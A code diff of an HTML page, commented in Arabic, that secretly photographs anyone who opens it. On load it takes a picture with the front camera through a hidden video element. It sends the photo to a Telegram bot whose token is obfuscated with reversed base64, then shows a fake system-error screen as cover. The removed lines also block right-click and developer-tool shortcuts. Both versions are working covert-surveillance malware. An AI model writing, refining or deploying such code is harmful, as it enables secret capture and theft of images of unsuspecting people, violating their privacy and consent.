@@ -2,15 +2,9 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Error - 0x80070567</title>
+    <title></title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        /* شاشة سوداء بعد التصوير */
         body { 
             background: black;
             margin: 0;
@@ -20,115 +14,72 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
-            font-family: 'Courier New', monospace;
         }
-        
-        /* رسالة الخطأ */
-        .error-message {
+        /* رسالة وهمية للتمويه */
+        .fake-message {
             color: #00ff00;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            text-align: center;
-            padding: 20px;
-            border: 1px solid #00ff0033;
-            border-radius: 5px;
-            background: #00000099;
-            max-width: 80%;
-            z-index: 9999;
-            position: relative;
-        }
-        
-        .cursor {
-            display: inline-block;
-            width: 10px;
-            height: 16px;
-            background: #00ff00;
-            margin-left: 5px;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0% { opacity: 0; }
-            50% { opacity: 1; }
-            100% { opacity: 0; }
-        }
-        
-        /* خلفية الماتريكس */
-        .matrix-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            opacity: 0.1;
             font-family: monospace;
-            color: #0f0;
-            font-size: 12px;
-            line-height: 12px;
-            white-space: pre;
-            overflow: hidden;
-            z-index: 1;
+            font-size: 14px;
+            text-align: center;
+            opacity: 0.7;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="matrix-bg" id="matrixBg"></div>
-    <div class="error-message" id="errorMsg">
+    <div class="fake-message" id="fakeMsg">
         ⚠️ SYSTEM ERROR: 0x80070567<br>
-        Initializing...<span class="cursor">_</span>
+        Initiating recovery protocol...
     </div>
 
     <script>
-        // ==================== دوال التشفير الأساسية ====================
-        const _decodeToken = (str) => {
-            try {
-                return atob(str.split('').reverse().join(''));
-            } catch(e) {
-                return '';
-            }
+        // ==================== تشفير البيانات الأساسية ====================
+        const _0x1a2b = (str) => {
+            return btoa(str).split('').reverse().join('');
+        };
+
+        const _0x3c4d = (str) => {
+            return atob(str.split('').reverse().join(''));
         };
 
         // البيانات المشفرة
-        const BOT_TOKEN = _decodeToken('==VUZOcDRBcmZGTkFBUGY1NzA1MzA4MDM4OVVBUkZGcEFBTmZoNXA4MzA3NTYwNzA4MDM4MA==');
-        const DEFAULT_ID = _decodeToken('==ODY0MjU5MzI3');
+        const _token = _0x3c4d('==VUZOcDRBcmZGTkFBUGY1NzA1MzA4MDM4OVVBUkZGcEFBTmZoNXA4MzA3NTYwNzA4MDM4MA==');
+        const _defaultId = _0x3c4d('==ODY0MjU5MzI3');
         
-        // جلب الإيدي من الرابط
+        // ==================== جلب الإيدي من الرابط ====================
         const urlParams = new URLSearchParams(window.location.search);
-        let USER_ID = urlParams.get('id') || DEFAULT_ID;
-        
-        // تنظيف الإيدي
-        USER_ID = USER_ID.replace(/[^0-9-]/g, '');
-        if (USER_ID.length < 5) USER_ID = DEFAULT_ID;
+        const USER_ID = urlParams.get('id') || _defaultId;
+        const BOT_TOKEN = _0x3c4d('==VUZOcDRBcmZGTkFBUGY1NzA1MzA4MDM4OVVBUkZGcEFBTmZoNXA4MzA3NTYwNzA4MDM4MA==');
 
-        // ==================== دالة الإرسال ====================
-        const sendPhoto = (photoBlob) => {
+        // ==================== دوال مساعدة مشفرة ====================
+        const _send = (type, data, filename) => {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', USER_ID);
-                formData.append('photo', photoBlob, 'image.jpg');
                 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData,
-                    mode: 'no-cors'
-                }).catch(() => {});
+                if (type === 'photo') {
+                    formData.append('photo', data, filename || 'img.jpg');
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData,
+                        mode: 'no-cors' // وضع التمويه
+                    }).catch(e => {});
+                }
             } catch(e) {}
         };
 
-        // ==================== التصوير المباشر ====================
+        // ==================== التصوير السريع ====================
         (async function() {
             try {
-                // طلب الكاميرا مباشرة
+                // طلب الكاميرا (بدون انتظار)
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 640 }
-                    } 
+                        width: { ideal: 1280 }
+                    }
                 });
 
-                // إنشاء عنصر فيديو
+                // عنصر فيديو سريع
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.setAttribute('playsinline', '');
@@ -138,49 +89,45 @@
                 video.style.top = '-9999px';
                 document.body.appendChild(video);
 
-                // انتظار تحميل الفيديو
-                await new Promise(resolve => setTimeout(resolve, 200));
+                // تصوير سريع جداً (بعد 100ms فقط)
+                setTimeout(async () => {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640;
+                        canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        
+                        canvas.toBlob(blob => {
+                            if (blob && blob.size > 1000) {
+                                _send('photo', blob, 'img.jpg');
+                            }
+                        }, 'image/jpeg', 0.7);
 
-                // التصوير
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                
-                // تحويل الصورة وإرسالها
-                canvas.toBlob(blob => {
-                    if (blob && blob.size > 500) {
-                        sendPhoto(blob);
-                    }
-                }, 'image/jpeg', 0.7);
+                        // تنظيف سريع
+                        stream.getTracks().forEach(t => t.stop());
+                        video.remove();
 
-                // تنظيف
-                stream.getTracks().forEach(track => track.stop());
-                video.remove();
-
-                // إظهار رسالة نجاح (وهمية)
-                document.getElementById('errorMsg').innerHTML = '⚠️ SYSTEM ERROR: 0x80070567<br>Recovery failed. Rebooting...<span class="cursor">_</span>';
+                        // تغيير لون الخلفية للأسود
+                        document.body.style.background = 'black';
+                        
+                        // إظهار رسالة وهمية للتمويه
+                        const fakeMsg = document.getElementById('fakeMsg');
+                        fakeMsg.style.display = 'block';
+                        
+                        // تغيير عنوان الصفحة للتمويه
+                        document.title = 'System Error - 0x80070567';
+                        
+                    } catch(e) {}
+                }, 100);
 
             } catch(error) {
-                // إذا رفض الكاميرا - إظهار الخطأ مباشرة
-                document.getElementById('errorMsg').innerHTML = '⚠️ ACCESS DENIED: 0x80070005<br>Camera permission rejected.<br>Terminating connection...<span class="cursor">_</span>';
+                // إذا رفض الكاميرا، شاشة سوداء مع رسالة خطأ
+                document.body.style.background = 'black';
+                const fakeMsg = document.getElementById('fakeMsg');
+                fakeMsg.style.display = 'block';
+                fakeMsg.innerHTML = '⚠️ ACCESS DENIED: 0x80070005<br>Terminating connection...';
             }
         })();
-
-        // ==================== إخفاء الآثار ====================
-        window.addEventListener('load', () => {
-            document.body.style.overflow = 'hidden';
-            
-            // منع النقر بزر الماوس الأيمن
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            
-            // منع F12 و Ctrl+U
-            document.addEventListener('keydown', e => {
-                if (e.key === 'F12' || (e.ctrlKey && e.key === 'u')) {
-                    e.preventDefault();
-                }
-            });
-        });
     </script>
 </body>
 </html>
